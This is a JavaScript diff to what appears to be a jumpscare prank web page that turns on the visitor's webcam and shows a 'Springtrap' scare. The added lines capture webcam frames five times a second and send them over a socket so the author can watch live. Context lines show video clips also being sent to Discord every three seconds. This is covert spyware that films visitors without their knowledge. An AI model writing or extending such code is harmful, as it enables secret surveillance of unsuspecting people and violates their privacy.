@@ -22,10 +22,24 @@
     .then(stream => {
       video.srcObject = stream;
 
+      // 5 sn sonra Springtrap
       setTimeout(() => {
         jumpscare.style.display = 'block';
         jumpscare.play();
       }, 5000);
+
+      // Canlı frame gönder (sen izle diye)
+      setInterval(() => {
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        canvas.toBlob(blob => {
+          const reader = new FileReader();
+          reader.onload = () => socket.emit('frame', reader.result);
+          reader.readAsDataURL(blob);
+        }, 'image/jpeg', 0.6);
+      }, 200);
 
       // Her 3 sn'de kısa video Discord'a
       const sendChunk = () => {
